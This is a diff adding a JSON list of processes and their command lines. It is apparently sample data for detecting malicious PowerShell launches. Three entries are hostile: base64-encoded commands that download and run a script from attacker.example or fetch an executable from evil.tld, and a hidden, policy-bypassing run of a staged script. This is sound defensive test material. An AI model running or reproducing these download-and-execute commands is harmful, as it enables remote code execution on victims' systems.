@@ -1,0 +1,27 @@
+[
+  {
+    "PID": 6101,
+    "Process": "powershell.exe",
+    "Args": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AZQB4AGEAbQBwAGwAZQAvAGEALgBwAHMAMQAiACkA"
+  },
+  {
+    "PID": 6102,
+    "Process": "powershell.exe",
+    "Args": "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Public\\stage2.ps1"
+  },
+  {
+    "PID": 6103,
+    "Process": "pwsh.exe",
+    "Args": "pwsh -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AdABsAGQALwB4ACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXAB4AC4AZQB4AGUA"
+  },
+  {
+    "PID": 4200,
+    "Process": "explorer.exe",
+    "Args": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "PID": 4201,
+    "Process": "svchost.exe",
+    "Args": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p"
+  }
+]
